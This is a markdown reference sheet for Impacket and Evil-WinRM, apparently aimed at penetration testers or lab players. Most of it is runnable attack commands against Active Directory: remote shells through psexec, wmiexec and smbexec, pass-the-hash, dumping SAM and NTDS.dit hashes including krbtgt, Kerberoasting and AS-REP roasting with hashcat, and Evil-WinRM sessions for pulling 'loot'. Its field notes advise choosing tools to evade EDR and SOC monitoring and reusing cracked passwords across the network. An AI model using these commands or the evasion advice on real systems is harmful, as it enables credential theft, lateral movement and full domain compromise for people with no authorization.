# Impacket + Evil-WinRM Reference

Practical reference for the Impacket toolset (Python classes/scripts for working with network protocols) and Evil-WinRM (remote shell over WinRM): the core toolkit for AD credential attacks and remote execution once you have valid creds.

## Table of Contents

1. [Remote Execution: Choosing the Right Script](#1-remote-execution-choosing-the-right-script)
2. [secretsdump.py](#2-secretsdumppy)
3. [Kerberoasting: GetUserSPNs.py](#3-kerberoasting-getuserspnspy)
4. [AS-REP Roasting: GetNPUsers.py](#4-as-rep-roasting-getnpuserspy)
5. [Evil-WinRM](#5-evil-winrm)
6. [Field Notes](#6-field-notes)

---

## 1. Remote Execution: Choosing the Right Script

Impacket ships several ways to get a shell on a target once you have credentials: they differ in the Windows service/protocol they ride on, which matters when one is blocked or logged differently than another.

```
psexec.py corp.local/jsmith:'Password123'@10.10.10.10          # domain user, creates & runs a service, noisy, full SYSTEM shell
psexec.py jsmith:'Password123'@10.10.10.10                     # local (non-domain) user variant
psexec.py administrator@10.10.10.10 -hashes :ntlmhash          # pass-the-hash, no cleartext password needed

wmiexec.py administrator@10.10.10.10 -hashes :ntlmhash         # rides WMI, no service drop, quieter, semi-interactive shell

smbexec.py corp.local/jsmith:'Password123'@10.10.10.10         # similar to psexec but avoids writing a binary to disk
```

`wmiexec` is generally the quieter option since it doesn't create and start a Windows service the way `psexec` does, worth defaulting to it when stealth matters more than a fully interactive shell.

## 2. secretsdump.py

Dumps credential material from a target: local SAM hashes, cached domain credentials, or (with the right access) the entire domain's NTDS.dit.

```
secretsdump.py corp.local/jsmith:'Password123'@10.10.10.10             # with credentials
secretsdump.py administrator@10.10.10.10 -hashes :ntlmhash             # with a hash instead

# Domain-wide dump once you have Domain Admin / DC-level access, the big one
secretsdump.py corp.local/administrator@10.10.10.100 -just-dc
secretsdump.py corp.local/administrator@10.10.10.100 -just-dc-user krbtgt   # single account only, e.g. krbtgt for golden ticket material
```

## 3. Kerberoasting: GetUserSPNs.py

Any authenticated domain user can request a service ticket (TGS) for an account with a registered Service Principal Name (SPN): service accounts, most commonly. That ticket is encrypted with the service account's password hash, so it can be extracted and cracked offline without touching the target service at all.

```
GetUserSPNs.py corp.local/jsmith:'Password123' -dc-ip 10.10.10.100 -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

Service accounts are a good target here because they're disproportionately likely to have old, weak, or never-rotated passwords.

## 4. AS-REP Roasting: GetNPUsers.py

Targets accounts that have Kerberos pre-authentication disabled: for those accounts, anyone can request an AS-REP and get back material encrypted with the user's password hash, no valid credentials needed at all.

```
GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.100
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## 5. Evil-WinRM

Once you have valid credentials and WinRM (port 5985) is reachable, this is the fastest path to a full interactive PowerShell-capable shell: no exploit needed, it's a legitimate remote management protocol.

```
evil-winrm -i 10.10.10.10 -u jsmith -p 'Password123'
evil-winrm -i 10.10.10.10 -u administrator -H ntlmhash    # pass-the-hash works here too
```

Inside the session, `upload`/`download` move files to/from the target directly, useful for pulling loot or pushing tools without standing up a separate file server.

## 6. Field Notes

**Match the execution method to what's actually open, and to how much noise is acceptable.** Port 5985 open → Evil-WinRM first, it's the cleanest option and gives the best interactive shell. No WinRM but SMB (445) reachable → `wmiexec` before `psexec`, since `psexec` drops and starts an actual Windows service (a much stronger, more log-visible signal on an EDR/SOC-monitored target). Always check what's actually listening before picking a tool. Don't reach for `psexec` out of habit when a quieter option would do the same job.

**A cracked service-account password from Kerberoasting is worth re-testing broadly, same as any other credential.** Service accounts often get reused as local admin somewhere else on the network.
